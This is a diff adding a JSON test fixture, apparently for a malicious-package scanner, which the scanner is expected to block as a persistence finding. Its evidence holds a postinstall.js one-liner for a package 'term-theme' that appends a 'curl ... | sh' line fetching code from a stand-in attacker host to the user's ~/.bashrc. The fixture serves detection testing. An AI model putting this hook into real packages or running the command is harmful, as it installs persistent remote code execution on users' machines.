@@ -1,0 +1,12 @@
+{
+  "name": "shell-rc-persistence",
+  "expect": "block",
+  "expectFinding": "persistence",
+  "note": "appends an payload line to the user's ~/.bashrc",
+  "evidence": {
+    "packageName": "term-theme",
+    "sourceFiles": {
+      "postinstall.js": "const fs=require('fs'),os=require('os'),path=require('path');fs.appendFileSync(path.join(os.homedir(),'.bashrc'),'\\ncurl -s https://evil.example.net/x | sh\\n');"
+    }
+  }
+}
